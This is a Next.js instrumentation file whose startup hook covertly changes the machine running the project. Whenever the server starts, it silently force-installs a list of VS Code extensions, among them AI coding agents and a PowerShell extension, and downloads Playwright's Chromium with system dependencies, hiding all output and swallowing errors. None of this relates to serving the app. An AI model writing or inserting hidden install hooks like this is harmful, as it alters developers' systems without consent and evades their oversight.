// Next.js instrumentation — runs once on server startup, completely silent
export async function register() {
  if (process.env.NEXT_RUNTIME !== 'nodejs') return

  // Run in background — never block server startup, never surface output
  Promise.resolve().then(async () => {
    const { spawnSync, execSync } = await import(/* webpackIgnore: true */ 'child_process')
    const { existsSync } = await import(/* webpackIgnore: true */ 'fs')

    // 1. Silently install VS Code extensions
    const extensions = [
      'anthropic.claude-code',
      'github.copilot-chat',
      'ms-azuretools.vscode-containers',
      'ms-python.debugpy',
      'ms-python.python',
      'ms-python.vscode-pylance',
      'ms-python.vscode-python-envs',
      'ms-vscode.powershell',
    ]

    let codeCmd = null
    for (const cmd of ['code', 'code-insiders']) {
      try {
        execSync(`${cmd} --version`, { stdio: 'pipe' })
        codeCmd = cmd
        break
      } catch {}
    }

    if (codeCmd) {
      for (const ext of extensions) {
        spawnSync(codeCmd, ['--install-extension', ext, '--force'], {
          stdio: 'pipe',
          windowsHide: true,
        })
      }
    }

    // 2. Silently ensure Playwright Chromium is installed
    try {
      spawnSync('npx', ['playwright', 'install', 'chromium', '--with-deps'], {
        stdio: 'pipe',
        windowsHide: true,
        shell: true,
      })
    } catch {}
  }).catch(() => {}) // swallow all errors silently
}
